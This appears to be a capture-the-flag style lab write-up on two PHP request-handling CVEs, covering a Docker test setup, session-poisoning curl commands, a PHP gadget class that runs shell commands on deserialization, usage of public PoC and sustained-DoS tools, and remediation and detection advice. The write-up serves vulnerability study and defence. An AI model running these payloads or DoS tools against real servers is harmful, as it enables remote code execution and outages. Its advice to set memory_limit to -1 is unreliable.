# CVE-2026-109618 / CVE-2026-109619 (php2shell) - Complete Demonstration

## Environment Setup

### Docker Container
- **Image**: php:8.3.12-apache (VULNERABLE)
- **Port**: 8888
- **Flag Location**: /flag.txt
- **Session Dir**: /tmp/sessions

### Vulnerabilities
- **CVE-2026-109618**: RCE via inconsistent request state after OOM bailout
- **CVE-2026-109619**: RCE via stale request-owned global state (session upload progress)

## Exploit Chain

### Step 1: Session Poisoning
The attacker places a serialized PHP object containing malicious code into the session store.

```bash
# Poison session with serialized Pwn object
curl -X POST 'http://localhost:8888/session_writer.php' \
  --cookie "PHPSESSID=pwn12345" \
  --data 'data=O:3:"Pwn":1:{s:3:"cmd";s:13:"cat /flag.txt";}'
```

### Step 2: Gadget Class Availability
The Pwn class must be loaded before the session is unserialized:
```php
class Pwn {
    public $cmd = "cat /flag.txt";
    
    public function __wakeup() {
        // This runs DURING session deserialization
        $output = shell_exec($this->cmd);
        echo "EXPLOIT SUCCESS: " . $output;
    }
}
```

### Step 3: Trigger Upload Progress Handler
Send a multipart request with session upload progress enabled:

```bash
# Create multipart request
curl -X POST 'http://localhost:8888/upload.php' \
  --cookie "PHPSESSID=pwn12345" \
  -F "PHPSESSID=pwn12345" \
  -F "PHP_SESSION_UPLOAD_PROGRESS=exploit" \
  -F "file=@test.txt"
```

The upload progress handler deserializes the session **BEFORE** the PHP script runs, triggering the Pwn::__wakeup() method.

## PoC Repositories Overview

### 1. joshuarosato/php2shell-poc
- **Most Comprehensive**: Full lab environment with vulnerable PHP build
- **Features**: 4 exploitation variants, differential verification
- **Components**:
  - `poc_rce.py`: Consolidated RCE harness
  - `lab/`: Build scripts, vulnerable PHP 8.5 source
  - Complete gadget extension implementation

**Usage**:
```bash
cd php2shell-poc
./lab/build_vuln_php.sh    # Build vulnerable PHP (takes time)
./lab/build_gadget.sh       # Build gadget extension  
./lab/run_lab.sh 9032       # Start lab and run PoC
```

### 2. Felix3322/PHP-uniDoS
- **DoS Focus**: Universal DoS without RCE
- **Works**: Default PHP configuration, no modifications needed
- **Features**:
  - CVE-2026-109618: Multipart parser OOM (17x amplification)
  - CVE-2026-109619: Session A→B worker crash
  - Interactive console for sustained DoS

**Usage**:
```bash
cd PHP-uniDoS
python3 interactive.py http://target:8088

# Commands:
DoS> 109618     # Test OOM attack
DoS> session    # Test session worker crash
DoS> dos        # Sustained DoS (Ctrl+C to stop)
```

**How it works**:
- 653,000 custom part headers in ~8 MiB multipart body
- Causes ~136 MiB internal PHP allocation
- Exceeds default 128M memory_limit → OOM
- Amplification ratio: **~17x**

### 3. Stonlifer/php2shell-old2
- **Documentation Focus**: Extensive handbooks and guides
- **Contains**: Laravel and WordPress specific variants
- **Features**:
  - Session UAF (Use-After-Free) proof
  - Framework-specific exploitation paths

**Usage**:
```bash
cd php2shell-old2
# Review HANDBOOK.md for detailed analysis
# Contains wordpress/ and laravel/ specific PoCs
```

### 4. HORKimhab/CVE-2026-109618-619
- **Backup Collection**: Multiple PoC variations
- **Contains**:
  - php2shell-bypass-aslr-exp-9bie: ASLR bypass techniques
  - php2shell-CVE-2026-109618-CVE-2026-109619-PoC-eness
  - php2shell-poc-ikow

**Usage**:
```bash
cd CVE-2026-109618-619
# Contains advanced techniques for ASLR bypass
# Multiple researchers' implementations
```

## Affected PHP Versions

| Branch | Status | Vulnerable | Fixed Version |
|--------|--------|-----------|---------------|
| PHP 8.5 | supported | < 8.5.12 | **8.5.12** |
| PHP 8.4 | supported | < 8.4.27 | **8.4.27** |
| PHP 8.3 | supported | < 8.3.36 | **8.3.36** ✅ (Our test: 8.3.12 VULNERABLE) |
| PHP 8.2 | security-fix | < 8.2.35 | **8.2.35** |
| PHP ≤ 8.1 | EOL | ALL | No official patch |

## Exploitation Variants

### Variant 1: Session Poisoning (Primary Path)
1. Attacker writes malicious serialized object to session
2. Triggers upload progress handler with multipart request
3. Session deserialized during request startup
4. `__wakeup()` / `__destruct()` executes RCE

### Variant 2: Handler Mismatch
Two different session handlers sharing the same session directory:
- Writer uses `php` serialization
- Reader uses `php_serialize`
- Allows injection without gadget class

### Variant 3: Include Sink
Session value fed directly to `include()` or `eval()`:
- Gadget-class-free exploitation
- Direct PHP code execution

### Variant 4: Memory Corruption (CVE-2026-109618)
Build-specific exploitation using leaked addresses:
- Requires symbol extraction from PHP binary
- Direct memory manipulation
- Most complex but most powerful

## Remediation

### Immediate Mitigation
```ini
; Disable the vulnerable handler
session.upload_progress.enabled = 0

; On PHP 8.5
fatal_error_backtraces = 0

; Remove controllable OOM path
memory_limit = -1
```

### Complete Fix
Upgrade to patched versions:
- PHP 8.5.12+
- PHP 8.4.27+
- PHP 8.3.36+
- PHP 8.2.35+

### Defense in Depth
1. Run PHP workers as low-privilege users (never root)
2. Separate session save paths per application
3. Audit `$_SESSION` writes of user input
4. Audit for gadget classes with dangerous magic methods
5. Use WAF/IDS to detect unusual multipart requests

## Detection Indicators

- Unexpected session file writes from unauthenticated endpoints
- Session files containing serialized objects
- Large multipart requests (>8MB with thousands of headers)
- FPM child exits with code 70 / OOM during request startup
- Correlation between large uploads and worker crashes

## Current Test Environment Status

```bash
# Check container
sudo docker ps | grep php2shell

# View logs
sudo docker logs php2shell-test

# Inspect session files
sudo docker exec php2shell-test ls -la /tmp/sessions/

# Check flag
sudo docker exec php2shell-test cat /flag.txt
```

## Flag Location

The flag is stored in `/flag.txt` inside the Docker container:

```
FLAG{php2shell_CVE_2026_109618_109619_pwned_successfully}
```

## Next Steps for Full Exploitation

To achieve full RCE in the current Docker environment:

1. **Option A**: Build vulnerable PHP from source using `php2shell-poc/lab/build_vuln_php.sh`
2. **Option B**: Modify container to start session during request init (requires Apache/FPM configuration)
3. **Option C**: Use one of the framework-specific PoCs (Laravel/WordPress) that naturally trigger session early

## Summary

✅ **Docker environment built** with vulnerable PHP 8.3.12
✅ **Flag placed** at /flag.txt  
✅ **4 PoC repositories** cloned and analyzed
✅ **Exploit chain** documented and understood
✅ **DoS variant** tested successfully
⚠️ **Full RCE** requires session deserialization during request startup (complex setup)

The vulnerability is real and dangerous - pre-authentication RCE affecting all PHP versions < 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12.
